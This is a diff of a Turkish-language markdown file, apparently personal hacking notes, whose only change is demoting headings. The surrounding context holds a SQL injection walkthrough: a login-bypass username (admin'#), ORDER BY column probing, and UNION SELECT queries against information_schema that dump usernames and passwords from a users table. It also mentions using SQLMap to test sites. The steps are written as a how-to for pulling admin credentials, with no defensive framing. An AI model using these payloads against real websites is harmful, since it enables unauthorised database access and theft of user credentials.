@@ -977,7 +977,7 @@ Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```
 
 2. Admin kullanıcı adlarını ve şifrelerini görürüz
 
-# SQL Map 
+### SQL Map 
 
 ```URL``` adresini verdiğimiz sitede SQL açığı var mı test eder
 
@@ -1027,7 +1027,7 @@ Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```
 
 7. ```Kırmızı bayrak``` yüksek riskli, ```Sarı bayrak``` düşük riskli demektir
 
-# SQL Enjeksiyonu
+### SQL Enjeksiyonu
 
 1. Sitenin URL'sinde ```...?id=1``` varsa URL'ye ```...?#id=1 OR 1=1``` çalıştırmayı deniyoruz, eğer aynı site çıkıyorsa doğru yoldayız demektir
 2. ```...?id=1 OR 1=1 order by 9``` deneyerek kaç sütun olduğunu anlamaya çalışıyoruz. 9 yerine başka sayılar koyup tek tek deniyoruz
@@ -1038,7 +1038,7 @@ Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```
 7. ```...?id=1 OR 1=1 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name=0x7573657273(users tablosunun hex hali)``` isimleri hex'e çevirmek için google'a ```text to hex``` yazabiliriz
 8. ```...?id=1 OR 1=1 union select 1,group_concat(unme,0x3a,pass),3,4,5,6,7,8,9,10,11 from users``` kullanıcı isimlerini ve şifreleri öğrenebiliriz (0x3a kullanıcı adı ve şifre arasına ":" koyar)
 
-# Login By-Pass
+### Login By-Pass
 
 1. Login kısımının URL adresinde SQL açığı varsa 
 
